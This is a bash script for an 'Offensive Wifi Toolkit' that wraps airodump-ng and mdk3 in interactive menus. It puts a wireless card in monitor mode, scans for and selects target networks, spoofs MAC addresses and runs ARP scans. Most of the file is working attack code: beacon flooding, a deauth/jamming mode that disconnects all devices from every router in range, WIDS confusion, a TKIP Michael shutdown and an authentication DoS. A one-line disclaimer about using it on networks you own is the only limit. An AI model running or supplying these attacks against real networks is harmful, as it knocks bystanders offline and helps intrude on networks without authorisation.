#!/bin/bash
#Offensive Wifi Toolkit (owt)
#Project start date (Feb. 8 2021)
#Created By Brennan Mccown (clu3bot)
#Version 3.0
#GPL v3.0 License


#colors vars
LBLUE='\033[1;34m'
LRED='\033[1;31m'
LGREEN='\033[1;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NONE='\033[0m'
PURPLE='\033[1;35m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
#

#predifined vars
S=1000
mon=Monitor
man=Managed
version="3.0"
language="English"
#user="clu3bot"
github="https://github.com/clu3bot/"
filename="OWT"
creator="Brennan Mccown (clu3bot)"
contactinfo="brennanmccown@protonmail.com"

#initial clear 
clear

#wrapper for echo with color and sleep
ewr() {
    sleep 0.05
    echo -e "$@"
}

#checks for updates of the script. This completely deletes the owt.sh file and then pulls the latest version back into the local git.

check_for_updates () {

    ewr "${YELLOW}Checking for updates${NONE}"
        while [ "$(git stash --include-untracked | git reset --hard | git pull https://github.com/clu3bot/owt.git > git.txt)" ]; do
            ewr "${NONE}[${LRED}Checking for updates to owt tool${NONE}]"
                ewr "\n${LBLUE}Please wait..${NONE}"
        done;
            if grep "Already" git.txt; then
                ewr "${LRED}owt is already up to date!${NONE}"
            rm -rf git.txt
                sleep 0.2
                    else
                ewr "${LRED}owt has been updated. Restart script for changes to take place.${NONE}"
            sleep 1
        rm -rf git.txt
    exit
fi


}

#says skipping updates when user chooses not to update

skip_updates () {
  clear
    ewr "${LGREEN}Skipping Updates..${NONE}"
  sleep 0.4

}

#checks to see if dns can be established or not which determines if updates will procede.

check_for_connect () {
    if ping -q -c 1 -W 1 8.8.8.8 >/dev/null; then
        check_for_updates
            else
        ewr "${LRED}Could not Check for Updates ${NONE}:${RED} DNS could not be established. Please read help.txt for more iformation.${NONE}"
        sleep 1.5
    ewr "${LGREEN}Skipping Updates..${NONE}"
  sleep 1.7
fi
}

#asks if the user would like to update the script.

ask_for_updates () {
    clear
        echo -e "${LGREEN}The script may have updates available\n${LRED}${d}\n${LBLUE}Would you like to check for them now? (Y/N)"
            read -r re
            if [[ "$re" == ["yY"]* ]]; then
                check_for_connect;
                    else
                skip_updates
            fi

}

#prints intro 1
intro_1 () {
echo -e "${LRED}
    ███████    █████   ███   █████ ███████████
  ███░░░░░███ ░░███   ░███  ░░███ ░█░░░███░░░█
 ███     ░░███ ░███   ░███   ░███ ░   ░███  ░
░███      ░███ ░███   ░███   ░███     ░███
░███      ░███ ░░███  █████  ███      ░███
░░███     ███   ░░░█████░█████░       ░███
 ░░░███████░      ░░███ ░░███         █████
   ░░░░░░░         ░░░   ░░░         ░░░░░ "

    echo -e "${YELLOW} \n         Offensive Wifi Toolkit (${filename})"
    echo -e "${LBLUE}\n     Created by ${creator}"
    echo -e "${LBLUE}                 Version ${version}${NONE}"
    echo -e "${YELLOW}\n                     ...${NONE} "
        sleep 1.5
    clear
    ask_for_updates
}

#calls intro 1 function
intro_1

#Sleeps for 1 seconds
    sleep 1
#clear intro
    clear


#checks if the user has root perms.

check_for_root () {

    isroot=$(whoami)

            if [ "$isroot" = "root" ]; then
                check="true"
                    else
                check="false"
            fi

}

###beta code### for prompt about eth0
eth0_prompt() {
    clear
    ewr "${LRED}Error Connecting. Try using a Wireless Interface as opposed to Wired. If this doesn't help, try running troubleshoot.sh${NONE}"    
        read -r -p "Press Enter to continue to Main Menu"
    main_menu
}

###beta code### to check if iface is equal to eth0 

check_eth0() {
    if [ "${iface}" == "eth0" ]; then
        eth0_prompt 
    fi
}

###beta code### checks if there is a wireless interface available
check_iface() {
    iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')

        if [[ -z "${iface// }" ]]; then
            iface="eth0"
        fi

            if [[ "${iface}" == "eth0" ]]; then
                mode="Wired Connection"
            else
                mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
            fi

        if [ "$mode" == "Monitor" ]; then 
            Mod=Monitor 
        else 
            Mod=Managed 
        fi
}

#print second intro

intro_2 () {
clear
    check_for_root
        ewr  "${LRED}Welcome To Offensive Wifi Toolkit${NONE}\n"
            ewr  "${LGREEN}-------------------------------------------------${NONE}"
        ewr  "${YELLOW}These tools are meant for use on networks you own\nHack at your own risk\n${NONE}"
        
            if [ "$check" = "true" ]; then
                perm="User is root"
            else        
                perm="User is not root"
            fi
            ewr "[${LRED}Permission Status${NONE}] ${LBLUE}${perm}${NONE}"
        check_iface
            ewr "[${LRED}Interface${NONE}] ${LBLUE}${iface}${NONE}"
        dn=$(lsb_release -is)
            ewr "[${LRED}Distribution${NONE}] ${LBLUE}${dn}${NONE}\n"
        ewr "${LGREEN}-------------------------------------------------${NONE}"
    ewr "${LBLUE}Check if all necessary packages are installed${NONE}"
    read -r -p "Press Enter to Continue.."
}

#checks permissions of the user due to root perms being required for the script to function properally. root perms are not optional

permissions_prompt () {
    check_for_root
        if [ "$check" = "false" ]; then
            ewr "${LRED}owt requires root permissions!${NONE}\n"
        if [ "$check" = "true" ]; then
            perm="User is root"
        else
            perm="User is not root"
        fi
        ewr "[${LRED}Permission Status${NONE}] ${LBLUE}${perm}${NONE}\n"
        ewr "${LBLUE}Restart owt by using ${LRED}sudo bash owt.sh${NONE}"
        ewr "\n${RED}Now exiting the script..${NONE}"
    sleep 0.8
    exit
        else
    sleep 0.1
    fi
}

#checks for dependent packages and then gives the user the option to download them. Without the dependencies the script will loose some to all functionality.

check_dependencies() {
     permissions_prompt
        dependencies=(aircrack-ng mdk3 xterm macchanger)
            for d in "${dependencies[*]}"; do
                if [ "$(dpkg-query -W -f='${Status}' "$d" 2>/dev/null | grep -c "ok installed")" -eq 0 ]; then
                echo -e "${LBLUE}Some or all of the following packages must be installed for the script to run...\n${LRED}${d}\n${LBLUE}Would you like to install them now? (Y/N)"
                read -r r

                if [[ "$r" == ["yY"]* ]]; then

                if [ -x "$(command -v apt-get)" ]; then
                sudo apt-get install $d;
                if [ -x "$(command -v apk)" ]; then
                    sudo apk add --no-cache $d;
                if [ -x "$(command -v dnf)" ]; then
                        sudo dnf install $d;
                if [ -x "$(command -v zypper)" ]; then
                            sudo zypper install $d;
                if [ -x "$(command -v pacman)" ]; then
                                sudo pacman -S $d;
                else
                    echo -e "${LRED}Could not locate a package manager."
                    echo -e "${LBLUE}Try mannually installing the following packages${NONE}:\n $d" >&2;
                        fi
                    fi
                fi
            fi
        fi
    fi
fi
done
}

#calls check dependencies var to check for required dependencies for the script
check_dependencies

#calls permission prompt var to check for the required root privileges.
permissions_prompt

#calls intro 2 function
intro_2

#
clear

#function for displaying whats happening when switching from managed to monitor or vise versa

ecmonm() {
    clear
    echo -e "${LGREEN}Putting Device in Monitor Mode${NONE}"
}

ecmanm() {
    clear
    echo -e "${LGREEN}Putting Device in Managed Mode${NONE}"
}


#checks if device is in monitor mode if not prompts the user to put device in monitor mode if the wireless card is in managed/station mode.

check_monitor_mode () {
    check_iface
    if [ "$Mod" == "Monitor" ]; then
            sleep 0.1
    else
        ewr "${LBLUE}This script requires $mon mode, would you like to enable it now? ${LRED}(Y/N)${NONE}"

	read -r re
    fi
    if [[ "$re" == ["yY"]* ]]; then
        ecmonm &
	ifconfig "$iface" up
	sleep 0.1
	airmon-ng start "$iface"
fi
}

#calls check monitor mode function

check_monitor_mode


#puts currently used wireless interface in monitor mode

monitor_mode () {
    check_eth0
    ecmonm &
    airmon-ng check kill
    check_iface
        if [ "$Mod" == "Monitor" ]; then
    clear
            echo -e "${LRED}Device already in $mon mode ${NONE}"
        sleep 0.5
    main_menu
        else
            sudo airmon-ng start "$iface"
    clear
            echo -e "${LRED}Device now in $mon Mode${NONE}"
    main_menu
    fi
}

#puts currently used wireless interface in managed/station mode
managed_mode () {
    check_eth0
    ecmanm &
    service network-manager start
    check_iface
        if [ "$Mod" == "Managed" ]; then
    clear
            echo -e "${LRED}Device already in $man mode ${NONE}"
        sleep 0.5
    main_menu
        else
            sudo airmon-ng stop "$iface"
    fi
    clear
            echo -e "${LRED}Device now in $man Mode${NONE}"
    main_menu
}

#scans for networks in the area then lists them in a numbered list for the user to select
scan_networks () {
check_eth0
clear
        check_iface
    if [ "$Mod" == "Monitor" ]; then
        sleep 0.1
    else
        echo -e "${LRED}This tool requires Monitor Mode${NONE}"
        read -r -p "Press Enter to return to Main Menu"
                main_menu
    fi
        scan_animation &
                #failsafe for exit
                trap 'airmon-ng stop $iface > /dev/null;rm otp-01.csv 2> /dev/null' EXIT
                #
                xterm -e airodump-ng --output-format csv -w otp "$iface" > /dev/null & sleep 10 ; kill $!
        sed -i '1d' otp-01.csv
    kill %1
        echo -e "\n\n${LRED}Scan Results${NONE}"
        cut -d "," -f 14 otp-01.csv | nl -n ln -w 6
                while [ ${S} -gt "$(wc -l otp-01.csv | cut -d " " -f 1)" ] || [ ${S} -lt 1 ]; do
        echo -e "\n${LBLUE}Select a Network"
        read -r -p "$(tput setaf 7) " S
    done
                nn=$(sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 )
        rm -rf otp-01.csv 2> /dev/null
        echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
        read -r -p "$(tput setaf 7)Press Enter to Continue.."
    clear
        main_menu
}


#creates the about page function for useful information about owt
about_page () {
clear

	ewr "${LRED}About owt${NONE}\n"
	    ewr "${PURPLE}--------------------------------${NONE}"
	        ewr "${YELLOW}Creator${NONE}:${YELLOW}$creator${NONE}"
	            ewr "${YELLOW}Github${NONE}:${YELLOW}$github${NONE}"
	                ewr "${YELLOW}Language${NONE}:${YELLOW}$language${NONE}"
	            ewr "${YELLOW}Version${NONE}:${YELLOW}$version${NONE}"
	        ewr "${YELLOW}Filename${NONE}:${YELLOW}$filename${NONE}"
	    ewr "${YELLOW}Contact${NONE}:${YELLOW}$contactinfo${NONE}"
	ewr "${PURPLE}--------------------------------${NONE}\n"
	    ewr "${LRED}Press 1 to return to Main Menu${NONE}"
}

#creates the wifi attacks menu function
wifi_attacks_menu () {
clear
check_eth0
check_mode
check_iface
echo -e "${LRED}
    ███████    █████   ███   █████ ███████████
  ███░░░░░███ ░░███   ░███  ░░███ ░█░░░███░░░█
 ███     ░░███ ░███   ░███   ░███ ░   ░███  ░
░███      ░███ ░███   ░███   ░███     ░███
░███      ░███ ░░███  █████  ███      ░███
░░███     ███   ░░░█████░█████░       ░███
 ░░░███████░      ░░███ ░░███         █████
   ░░░░░░░         ░░░   ░░░         ░░░░░ "
   
	ewr "\n${NONE}[${LRED}Interface${NONE}]${LBLUE} ${iface}${NONE}   [${LRED}Mode${NONE}]${LBLUE} ${Mod}${NONE}   [${LRED}Target Network${NONE}]${LBLUE} ${nn}${NONE}\n"
    
	ewr "${PURPLE}----------${NONE}[${LBLUE}General${NONE}]${PURPLE}---------\n"
	ewr "${NONE}[${LGREEN}0${NONE}] ${YELLOW} Main Menu\n"
	ewr "${PURPLE}-------${NONE}[${LBLUE}Wifi Attacks${NONE}]${PURPLE}-------\n"
	ewr "${NONE}[${LGREEN}1${NONE}] ${YELLOW} Beacon Flood Attack"
	ewr "${NONE}[${LGREEN}2${NONE}] ${YELLOW} Deauth/Jamming Attack"
	ewr "${NONE}[${LGREEN}3${NONE}] ${YELLOW} Basic AP Probe"
	ewr "${NONE}[${LGREEN}4${NONE}] ${YELLOW} WIDS/WIPS Confusion Attack"
	ewr "${NONE}[${LGREEN}5${NONE}] ${YELLOW} Michael Shutdown Exploitation"
        ewr "${NONE}[${LGREEN}6${NONE}] ${YELLOW} Authentication DoS Attack (AP Freeze)\n"
        ewr "${PURPLE}---------------------------${NONE}"
while true; do
echo -e "${LRED}Select an option:${NONE}"
read -r -p "$(tput setaf 7)" option
case $option in

  0) echo -e "\n${NONE}${YELLOW}Selected${NONE}»${NONE} [${LBLUE}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     main_menu
     ;;
  1) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${LBLUE}$option${NONE}]"
     read -r -p  "Are you sure? Press Enter.."
     beacon_flood_attack
     ;;
  2) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${LBLUE}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     deauth_attack
     ;;
  3) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${LBLUE}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     probe_attack
     ;;
  4) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${LBLUE}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     confusion_attack
     ;;
  5) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${LBLUE}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     michael_shutdown
     ;;
  6) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${LBLUE}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     authentication_dos
     ;;
  *) echo -e "${LRED}Not an Option${NONE}"
     wifi_attacks_menu
     ;;
esac
done
}

#beacon flood attack using mdk3 /// creates fake aps which will appear in the general vicinity of the device.
beacon_flood_attack () {
    clear
    check_mode
    check_iface
    
        echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
            sleep 0.5
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Beacon Flood Selected${NONE}"
             sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets${NONE}"
             sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Spamming Network APs${NONE}"
    mdk3 "$iface" b -s 250
}

#airplay deauth frame attack using mdk3 /// disconnects all divices from every router in range
deauth_attack () {
    clear
    check_mode
    check_iface

        echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
            sleep 0.5
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Deauth/Jammer Selected${NONE}"
            sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
            sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Disconnecting all Devices From Networks..${NONE}"
    mdk3 "$iface" d -c
}

#wids/wips confusion attack using mdk3 /// when wps pin is known the attack and crack the password of the wireless network. this is currently a beta feature // needs improvement, might use something other the mdk3 to preform this attack in the future.
confusion_attack () {
    clear
    check_mode
    check_network_name
    check_iface
    
        echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
            sleep 0.5
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}AP Probe Selected${NONE}"
            sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
            sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}WIDS/WIPS Confusion Commencing.."
    mdk3 "$iface" w -c -z -t "$nn"
}

#probe using mdk3 /// kinda of useless but can sometimes crash much older routers or routers with very out dated firmware
probe_attack () {
    clear
    check_mode
    check_network_name
    check_iface
    
        echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
            sleep 0.5
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}AP Probe Selected${NONE}"
            sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
            sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Probing Network.."
    mdk3 "$iface" p -e "$nn"
}

#michael shutdown exploitation using mdk3 /// outdated but depending on the routers firmware this attack can shutdown Aps using TKIP encryption // currently searching for other attack methods to replace MSTKIP
michael_shutdown () {
    clear
    check_mode
    check_network_name
    
        echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
            sleep 0.5
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}TKIP Selected${NONE}"
            sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
            sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}TKIP Exploit Commencing.."
    mdk3 "$iface" m -t "$nn" -w 5 -n 100
}

#auth dos attack using mdk3 /// sends fabricated authentication frames to routers in order to capture handshake. works with wpa2 sometimes ###needs fixing
authentication_dos () {
    clear
    check_mode
    check_network_name
    
        echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
            sleep 0.5
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}TKIP Selected${NONE}"
            sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
            sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Authentication DoS Attack Commencing.."
    mdk3 "$iface" a -a "$nn" -c -s 400
}

#saves the output of the arp scan
arp_output () {
        sudo arp-scan -I $iface -l | awk 'NR > 3' | head -n -3 > arpoutput-01.txt
}

#runs and arp scan and asks if user wants to save the output after
arp_command () {
       check_iface
            sudo arp-scan -I $iface -l | awk 'NR > 3' | head -n -3
            echo -e "${YELLOW}\nSave this output to a file? ${LBLUE}(Y/N)${NONE}"
       
}

#runs and arp scan for router names and mac addresses
arp_scan () {
check_eth0
clear
arp_command &
echo -e "${LGREEN}Scanning..${NONE}" && sleep 2;
clear
echo -e "${LRED}Output:${NONE}"
read -r r
if [[ "$r" == ["yY"]* ]]; then
        arp_output &
	echo -e "${LGREEN}Saving Output to file.${NONE}"
        sleep 0.7
        clear
        echo -e "${LGREEN}Saving Output to file..${NONE}"
        sleep 0.7
        clear
        echo -e "${LGREEN}Saving Output to file...${NONE}"
        sleep 0.7
        clear
        sleep 1
        echo -e "${LRED}File has been saved as arpoutput-01.txt"
        sleep 2
        main_menu;
else
        clear
        echo -e "${LGREEN}Returning to Main Menu${NONE}"
	sleep 1.5
        main_menu;
fi
}

#spoofs the mac address of the interface being used. should work on eth0 ##needs more testing and improvemnt.
mac_spoof () {
        clear
        check_iface
        sudo ifconfig $iface down
        sudo macchanger -r ${iface}
        sleep 1
        echo -e "${LRED}Your mac-address has now been changed.${NONE}"
        clear
        sleep 1.5
        echo -e "${YELLOW}Returning to Main Menu${NONE}"
        sleep 1.5
        main_menu
}

#checks if interface exists for variable assignment
check_mode_for_vars () {
check_iface
}

#checks if interface is in monitor or managed mode /// for tools that require monitor mode
check_mode () {
check_iface
if [ "$Mod" == "Monitor" ]; then
    sleep 0.1
else
    echo -e "${LRED}This tool requires $mon Mode${NONE}"
read -r -p "Press Enter to continue to Main Menu"
main_menu
fi
}

#checks if the network name var is assigned
check_network_name () {
if [ -z ${nn+x} ]; then

echo -e "${LBLUE}For this you must select a Network, would you like do do this now? ${LRED}(Y/N)${NONE}"
read -r ra

if [[ "$ra" == ["yY"]* ]]; then
        scan_network_networkname
sleep 0.5
else
clear
echo "Returning to Main Menu.."
sleep 0.8
main_menu
fi

else

sleep 0.1

fi
}

#scan networks specifically for attacks that require it and may be missing a targeted network name
scan_network_networkname () {
clear
check_eth0
check_iface
       if [ "$Mod" == "Monitor" ]; then
        sleep 0.1
    else
        echo -e "${LRED}This tool requires Monitor Mode${NONE}"
        read -r -p "Press Enter to return to Main Menu"
                main_menu
    fi
        scan_animation &
        
                trap 'airmon-ng stop $iface > /dev/null;rm otp-01.csv 2> /dev/null' EXIT
                xterm -e airodump-ng --output-format csv -w otp "$iface" > /dev/null & sleep 10 ; kill $!
        sed -i '1d' otp-01.csv
    kill %1
        echo -e "\n\n${LRED}Scan Results${NONE}"
        cut -d "," -f 14 otp-01.csv | nl -n ln -w 6
                while [ "${S}" -gt "$(wc -l otp-01.csv | cut -d " " -f 1)" ] || [ "${S}" -lt 1 ]; do
        echo -e "\n${LBLUE}Select a Network"
        read -r -p "$(tput setaf 7) " S
    done
                nn=$(sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 )
        rm -rf otp-01.csv 2> /dev/null
        echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
        read -r -p "$(tput setaf 7)Press Enter to Continue.."
    clear
}

#animation while scanning networks.

ii="S"
oo="Sc"
pp="Sca"
ll="Scan"
kk="Scann"
jj="Scanni"
hh="Scannin"
gg="Scanning"
ff="Scanning-"
vv="Scanning-N"
bb="Scanning-Ne"
cc="Scanning-Net"
xx="Scanning-Netw"
zz="Scanning-Netwo"
yy="Scanning-Networ"
tt="Scanning-Network"
qq="Scanning-Networks"

s() {
sleep 0.15
clear
}

scan_animation() {
echo -e "[${LBLUE}${ii}${NONE}]"
s
echo -e "[${LBLUE}${oo}${NONE}]"
s
echo -e "[${LBLUE}${pp}${NONE}]"
s
echo -e "[${LBLUE}${ll}${NONE}]"
s
echo -e "[${LBLUE}${kk}${NONE}]"
s
echo -e "[${LBLUE}${jj}${NONE}]"
s
echo -e "[${LBLUE}${hh}${NONE}]"
s
echo -e "[${LBLUE}${gg}${NONE}]"
s
echo -e "[${LBLUE}${ff}${NONE}]"
s
echo -e "[${LBLUE}${vv}${NONE}]"
s
echo -e "[${LBLUE}${bb}${NONE}]"
s
echo -e "[${LBLUE}${cc}${NONE}]"
s
echo -e "[${LBLUE}${xx}${NONE}]"
s
echo -e "[${LBLUE}${zz}${NONE}]"
s
echo -e "[${LBLUE}${yy}${NONE}]"
s
echo -e "[${LBLUE}${tt}${NONE}]"
s
echo -e "[${LBLUE}${qq}${NONE}]"
}

#gives the user to stop or keep montior mode upon exiting the script traps control c. this is a beta feature needs improvment.

termination () {
check_iface
            if [ "$Mod" == "Managed" ]; then
                    exit
                else
            clear
        echo -e "${LBLUE}Exiting OWT, would you like to remain in Monitor Mode? ${LRED}(Y/N)${NONE}"
            read -r ro
              fi
        if [[ "$ro" == ["yY"]* ]]; then
               exit
                    else
            service network-manager start
        iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
            mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
    if [ "$mode" ==  "Managed" ]; then
        Mod=Managed
            else
        Mod=Monitor
        fi
        if [ "$Mod" == "Managed" ]; then
            clear
        echo -e "${LRED}Device already in $man mode ${NONE}"
            sleep 0.5
                main_menu
            else
        sudo airmon-ng stop "$iface"
            fi
               clear
            exit
          fi
}

trap termination EXIT

#prints the main menu with options

main_menu () {
clear
check_iface

echo -e "${LRED}
    ███████    █████   ███   █████ ███████████
  ███░░░░░███ ░░███   ░███  ░░███ ░█░░░███░░░█
 ███     ░░███ ░███   ░███   ░███ ░   ░███  ░
░███      ░███ ░███   ░███   ░███     ░███
░███      ░███ ░░███  █████  ███      ░███
░░███     ███   ░░░█████░█████░       ░███
 ░░░███████░      ░░███ ░░███         █████
   ░░░░░░░         ░░░   ░░░         ░░░░░ "
   

    ewr "\n${NONE}[${LRED}Interface${NONE}]${LBLUE} ${iface}${NONE}   [${LRED}Mode${NONE}]${LBLUE} ${Mod}${NONE}   [${LRED}Target Network${NONE}]${LBLUE} ${nn}${NONE}\n"
	
	ewr "${PURPLE}---------${NONE}[${LBLUE}General${NONE}]${PURPLE}----------\n"
	ewr "${NONE}[${LGREEN}0${NONE}] ${YELLOW}Exit"
	ewr "${NONE}[${LGREEN}1${NONE}] ${YELLOW}Main Menu"
	ewr "${NONE}[${LGREEN}2${NONE}] ${YELLOW}Put Device in Monitor Mode"
	ewr "${NONE}[${LGREEN}3${NONE}] ${YELLOW}Put Device in Managed Mode"
	ewr "${NONE}[${LGREEN}4${NONE}] ${YELLOW}Scan Networks\n"
	ewr "${PURPLE}-------${NONE}[${LBLUE}Wifi Attacks${NONE}]${PURPLE}-------\n"
	ewr "${NONE}[${LGREEN}5${NONE}] ${YELLOW}Wifi Attack Menu${NONE}\n"
	ewr "${PURPLE}----------${NONE}[${LBLUE}Other${NONE}]${PURPLE}-----------\n"
        ewr "${NONE}[${LGREEN}6${NONE}] ${YELLOW}Spoof Your Mac Address"
	ewr "${NONE}[${LGREEN}7${NONE}] ${YELLOW}ARP Scan For Devices"
	ewr "${NONE}[${LGREEN}8${NONE}] ${YELLOW}About owt\n"
	ewr "${PURPLE}----------------------------${NONE}"
while true; do
ewr "\n${LRED}Select an option:${NONE}"
read -r -p "$(tput setaf 7)" option
case $option in

  0) echo -e "\n${NONE}${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
	clear
     exit 0
     ;;
  1) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p  "Are you sure? Press Enter.."
     main_menu
     ;;
  2) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     monitor_mode
     ;;
  3) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     managed_mode
     ;;
  4) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     scan_networks
     ;;
  5) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     wifi_attacks_menu
     ;;
  6) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     mac_spoof
     ;;
  7) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     arp_scan
     ;;
  8) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     about_page
     ;;
  *) echo -e "Not an Option"
     main_menu
     ;;
esac
done
}

#calls for main menu function
clear
main_menu

#all functions
OWT () {
intro_1
intro_2
permissions_prompt
check_monitor_mode
check_dependencies
main_menu
monitor_mode
managed_mode
scan_networks
about_page
wifi_attacks_menu
beacon_flood_attack
deauth_attack
confusion_attack
probe_attack
check_mode_for_vars
check_mode
check_network_name
scan_network_networkname
termination
ctrl_c
scan_animation
arp_scan
arp_command
arp_output
mac_spoof
}

OWT
